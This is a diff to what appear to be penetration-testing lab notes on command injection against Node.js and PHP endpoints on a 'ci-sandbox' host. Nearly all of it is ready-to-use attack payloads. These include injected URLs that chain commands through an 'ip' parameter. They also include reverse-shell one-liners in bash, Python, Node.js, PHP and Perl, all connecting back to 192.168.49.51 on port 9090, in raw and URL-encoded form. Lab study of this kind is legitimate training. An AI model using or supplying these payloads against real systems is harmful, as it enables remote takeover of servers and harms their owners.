@@ -17,6 +17,8 @@ http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|cat%20/var/tmp/exercise_chaining_
 
 #### Input Normalization
 
+Add bash -c '[COMMAND]'
+
 ```
 http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'
 
@@ -214,4 +216,93 @@ Calling:
 
 ```
 http://ci-sandbox/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+```
+#### Obtaining a Shell - Node.js
+
+Chained node.js reverse Shell
+
+```
+echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
+
+```
+Full command:
+
+```
+http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
+```
+
+Url encoded:
+
+```
+http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
+```
+
+#### Obtaining a Shell - PHP
+
+PHP Reverse Shell:
+
+```
+php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+```
+PHP Execution options:
+
+```
+exec("/bin/sh -i <&3 >&3 2>&3");'
+shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+system("/bin/sh -i <&3 >&3 2>&3");'
+passthru("/bin/sh -i <&3 >&3 2>&3");'
+popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+```
+Unencoded endpoint:
+
+```
+http://ci-sandbox/php/index.php?ip=127.0.0.1;php -r "system(\"bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'\");"
+
+```
+
+Complete Endpoint:
+
+```
+http://ci-sandbox/php/index.php?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27%5C%22)%3B%22
+
+```
+
+#### Obtaining a Shell - Perl
+
+Perl reverse shell one liner
+
+```
+perl -e 'use Socket;$i="192.168.49.51";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+```
+
+Perl reverse shell:
+
+```
+use Socket;
+$i="192.168.49.51";
+$p=9090;
+
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+
+if(connect(S,sockaddr_in($p,inet_aton($i)))) {
+     open(STDIN,">&S");
+     open(STDOUT,">&S");
+     open(STDERR,">&S");
+     exec("/bin/sh -i");
+}
+
+```
+
+URL Encoded:
+
+```
+http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
+
 ```
